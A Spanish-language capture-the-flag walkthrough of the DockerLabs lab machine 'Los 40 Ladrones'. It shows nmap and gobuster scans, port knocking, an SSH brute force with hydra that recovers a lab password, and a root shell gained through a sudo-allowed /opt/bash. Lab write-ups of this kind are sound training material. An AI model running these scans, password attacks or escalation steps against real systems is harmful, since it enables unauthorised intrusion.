---
icon: flag
---

# Los 40 Ladrones DockerLabs (Easy)

## Instalación

Cuando obtenemos el `.zip` nos lo pasamos al entorno en el que vamos a empezar a hackear la maquina y haremos lo siguiente.

```shell
unzip los40ladrones.zip
```

Nos lo descomprimira y despues montamos la maquina de la siguiente forma.

```shell
bash auto_deploy.sh los40ladrones.tar
```

Info:

```
                            ##        .         
                      ## ## ##       ==         
                   ## ## ## ##      ===         
               /""""""""""""""""\___/ ===       
          ~~~ {~~ ~~~~ ~~~ ~~~~ ~~ ~ /  ===- ~~~
               \______ o          __/           
                 \    \        __/            
                  \____\______/               
                                          
  ___  ____ ____ _  _ ____ ____ _    ____ ___  ____ 
  |  \ |  | |    |_/  |___ |__/ |    |__| |__] [__  
  |__/ |__| |___ | \_ |___ |  \ |___ |  | |__] ___] 
                                         
                                     

Estamos desplegando la máquina vulnerable, espere un momento.

Máquina desplegada, su dirección IP es --> 172.17.0.2

Presiona Ctrl+C cuando termines con la máquina para eliminarla
```

Por lo que cuando terminemos de hackearla, le damos a `Ctrl+C` y nos eliminara la maquina para que no se queden archivos basura.

## Escaneo de puertos

```shell
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn <IP>
```

```shell
nmap -sCV -p<PORTS> <IP>
```

Info:

```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-17 11:18 EST
Nmap scan report for express.dl (172.17.0.2)
Host is up (0.000031s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.58 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.58 (Ubuntu)
MAC Address: 02:42:AC:11:00:02 (Unknown)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.71 seconds
```

Vemos una web de `apache2` normal, por lo que vamos a realizar un poco de `fuzzing`:

## Gobuster

```shell
gobuster dir -u http://<IP>/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x html,php,txt -t 100 -k -r
```

Info:

```
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://172.17.0.2/
[+] Method:                  GET
[+] Threads:                 100
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              html,php,txt
[+] Follow Redirect:         true
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/index.html           (Status: 200) [Size: 10792]
/.php                 (Status: 403) [Size: 275]
/.html                (Status: 403) [Size: 275]
/qdefense.txt         (Status: 200) [Size: 111]
/.php                 (Status: 403) [Size: 275]
/.html                (Status: 403) [Size: 275]
/server-status        (Status: 403) [Size: 275]
Progress: 882240 / 882244 (100.00%)
===============================================================
Finished
===============================================================
```

Vemos un archivo interesante llamado `/qdefense.txt` que si entramos dentro de el veremos lo siguiente:

## Escalate user toctoc

```
Recuerda llama antes de entrar , no seas como toctoc el maleducado
7000 8000 9000
busca y llama +54 2933574639
```

Vemos que tenemos que hacer un `portknocking` de la siguiente forma en nuestro `host`:

```shell
knock <IP> 7000 8000 9000
```

Ahora si nosotros enumeramos que puertos estan abiertos de nuevo:

```shell
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn <IP>
```

Info:

```
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-17 11:52 EST
Initiating ARP Ping Scan at 11:52
Scanning 172.17.0.2 [1 port]
Completed ARP Ping Scan at 11:52, 0.06s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 11:52
Scanning 172.17.0.2 [65535 ports]
Discovered open port 22/tcp on 172.17.0.2
Discovered open port 80/tcp on 172.17.0.2
Completed SYN Stealth Scan at 11:53, 26.37s elapsed (65535 total ports)
Nmap scan report for 172.17.0.2
Host is up, received arp-response (0.000063s latency).
Scanned at 2025-01-17 11:52:34 EST for 27s
Not shown: 65533 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 64
80/tcp open  http    syn-ack ttl 64
MAC Address: 02:42:AC:11:00:02 (Unknown)

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 26.55 seconds
           Raw packets sent: 131090 (5.768MB) | Rcvd: 24 (1.040KB)
```

Vemos que se nos ha abierto el puerto `SSH` por lo que vamos a probar a poner como usuario `toctoc` ya que parece que se refiere a el como un usuario y tirarle fuerza bruta con `hydra`:

### Hydra

```shell
hydra -l toctoc -P <WORDLIST> ssh://<IP> -t 64
```

Info:

```
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-01-17 11:54:52
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 64 tasks per 1 server, overall 64 tasks, 14344399 login tries (l:1/p:14344399), ~224132 tries per task
[DATA] attacking ssh://172.17.0.2:22/
[STATUS] 323.00 tries/min, 323 tries in 00:01h, 14344106 to do in 740:09h, 34 active
[STATUS] 264.67 tries/min, 794 tries in 00:03h, 14343635 to do in 903:16h, 34 active
[22][ssh] host: 172.17.0.2   login: toctoc   password: kittycat
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 28 final worker threads did not complete until end.
[ERROR] 28 targets did not resolve or could not be connected
[ERROR] 0 target did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-01-17 11:58:17
```

Vemos que hemos encontrados las credenciales del usuario `toctoc` por lo que nos conectaremos a el.

### SSH

```shell
ssh toctoc@<IP>
```

Metemos como contraseña `kittycat` y veremos que estamos dentro como dicho usuario.

## Escalate Privileges

Si hacemos `sudo -l` veremos los siguiente:

```
Matching Defaults entries for toctoc on f120d0baef4d:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User toctoc may run the following commands on f120d0baef4d:
    (ALL : NOPASSWD) /opt/bash
    (ALL : NOPASSWD) /ahora/noesta/function
```

Vemos que podemos ejecutare el binario `/opt/bash` como el usuario `root`, por lo que haremos lo siguiente:

```shell
sudo /opt/bash
```

Si ejecutamos eso veremos que somos `root`, por lo que ya la habremso termiando.
